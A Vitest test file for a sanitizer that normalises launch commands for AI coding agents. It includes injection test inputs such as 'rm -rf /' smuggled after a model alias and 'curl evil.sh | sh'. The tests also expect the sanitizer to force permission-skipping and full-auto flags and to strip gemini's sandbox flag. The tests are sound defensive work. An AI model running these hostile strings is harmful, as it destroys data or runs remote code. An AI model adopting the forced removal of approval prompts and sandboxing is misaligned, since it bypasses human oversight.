import { describe, it, expect } from 'vitest'
import { sanitizeAgentCommand, AGENT_COMMAND_ALLOWLIST, AGENT_MODEL_ALIASES } from '../../src/main/agentCommandSanitizer'

describe('sanitizeAgentCommand', () => {
  // ---- Correct commands pass through ----

  it('passes through correct claude command', () => {
    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions')).toBe('claude --dangerously-skip-permissions')
  })

  it('passes through correct gemini command', () => {
    expect(sanitizeAgentCommand('gemini')).toBe('gemini')
  })

  it('passes through correct codex command', () => {
    expect(sanitizeAgentCommand('codex --full-auto')).toBe('codex --full-auto')
  })

  it('passes through correct qwen command', () => {
    expect(sanitizeAgentCommand('qwen')).toBe('qwen')
  })

  // ---- Strips -p flag from all agents ----

  it('strips -p flag from claude', () => {
    expect(sanitizeAgentCommand('claude -p "Build the app"')).toBe('claude --dangerously-skip-permissions')
  })

  it('strips -p flag from gemini', () => {
    expect(sanitizeAgentCommand('gemini -p "Write docs"')).toBe('gemini')
  })

  it('strips -p flag from codex', () => {
    expect(sanitizeAgentCommand('codex -p "Fix tests"')).toBe('codex --full-auto')
  })

  it('fixes bare codex to include --full-auto', () => {
    expect(sanitizeAgentCommand('codex')).toBe('codex --full-auto')
  })

  // ---- Strips --sandbox from gemini ----

  it('strips --sandbox from gemini', () => {
    expect(sanitizeAgentCommand('gemini --sandbox')).toBe('gemini')
  })

  it('strips --sandbox -p from gemini', () => {
    expect(sanitizeAgentCommand('gemini --sandbox -p "Do stuff"')).toBe('gemini')
  })

  // ---- Strips --dangerously-skip-permissions with prompt appended ----

  it('strips prompt appended after claude flags', () => {
    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions "Build something"'))
      .toBe('claude --dangerously-skip-permissions')
  })

  // ---- Non-agent commands pass through ----

  it('passes through non-agent commands like ls', () => {
    expect(sanitizeAgentCommand('ls -la')).toBe('ls -la')
  })

  it('passes through non-agent commands like npm', () => {
    expect(sanitizeAgentCommand('npm install')).toBe('npm install')
  })

  it('passes through git commands', () => {
    expect(sanitizeAgentCommand('git status')).toBe('git status')
  })

  // ---- Handles paths to agent binaries ----

  it('handles full path to claude binary', () => {
    expect(sanitizeAgentCommand('/usr/local/bin/claude -p "test"')).toBe('claude --dangerously-skip-permissions')
  })

  it('handles Windows path to gemini binary', () => {
    expect(sanitizeAgentCommand('C:\\Users\\bin\\gemini --sandbox -p "test"')).toBe('gemini')
  })

  // ---- Edge cases ----

  it('handles whitespace-padded commands', () => {
    expect(sanitizeAgentCommand('  gemini -p "test"  ')).toBe('gemini')
  })

  it('handles claude with only extra flags (no prompt)', () => {
    expect(sanitizeAgentCommand('claude --print')).toBe('claude --dangerously-skip-permissions')
  })

  // ---- Allowlist has all expected agents ----

  it('has entries for all four MCP-native agent types', () => {
    expect(Object.keys(AGENT_COMMAND_ALLOWLIST)).toEqual(['claude', 'codex', 'gemini', 'qwen'])
  })

  // ---- Model brokering: a validated `--model <alias>` is allowed for Claude only ----

  it('allows a validated Claude model flag, reconstructed from the allowlist', () => {
    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions --model sonnet'))
      .toBe('claude --dangerously-skip-permissions --model sonnet')
    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions --model haiku'))
      .toBe('claude --dangerously-skip-permissions --model haiku')
    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions --model opus'))
      .toBe('claude --dangerously-skip-permissions --model opus')
  })

  it('reconstructs the safe base command even when the conductor omits the base flag', () => {
    expect(sanitizeAgentCommand('claude --model sonnet'))
      .toBe('claude --dangerously-skip-permissions --model sonnet')
  })

  it('accepts the --model=alias form', () => {
    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions --model=haiku'))
      .toBe('claude --dangerously-skip-permissions --model haiku')
  })

  it('strips an unknown / non-allowlisted model alias down to the base command', () => {
    expect(sanitizeAgentCommand('claude --model gpt-4')).toBe('claude --dangerously-skip-permissions')
    expect(sanitizeAgentCommand('claude --model sonnet-4-6')).toBe('claude --dangerously-skip-permissions')
    expect(sanitizeAgentCommand('claude --model')).toBe('claude --dangerously-skip-permissions') // no value
  })

  it('does NOT let a model flag smuggle a shell injection through', () => {
    // A `;`-glued alias ("sonnet;") is not a clean match → drop the model flag too
    // and fall back to the bare base command (the safest outcome).
    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions --model sonnet; rm -rf /'))
      .toBe('claude --dangerously-skip-permissions')
    // When the alias itself is clean (space-separated), keep it and discard the rest.
    expect(sanitizeAgentCommand('claude --model sonnet && curl evil.sh | sh'))
      .toBe('claude --dangerously-skip-permissions --model sonnet')
    // A quoted/garbled alias is not an exact match → no model flag at all.
    expect(sanitizeAgentCommand('claude --model "sonnet; rm -rf /"'))
      .toBe('claude --dangerously-skip-permissions')
    expect(sanitizeAgentCommand('claude --model sonnet$(rm -rf /)'))
      .toBe('claude --dangerously-skip-permissions')
  })

  it('does NOT honor --model on agents without model control (they keep their default)', () => {
    expect(sanitizeAgentCommand('gemini --model gemini-2.5-pro')).toBe('gemini')
    expect(sanitizeAgentCommand('codex --full-auto --model o4')).toBe('codex --full-auto')
    expect(sanitizeAgentCommand('qwen --model qwen-max')).toBe('qwen')
  })

  it('still strips -p even when a valid model is also present', () => {
    expect(sanitizeAgentCommand('claude -p "do it" --model sonnet'))
      .toBe('claude --dangerously-skip-permissions --model sonnet')
  })

  it('exposes Claude-only model aliases', () => {
    expect(AGENT_MODEL_ALIASES.claude).toEqual(['opus', 'sonnet', 'haiku'])
    expect(AGENT_MODEL_ALIASES.gemini).toBeUndefined()
  })
})
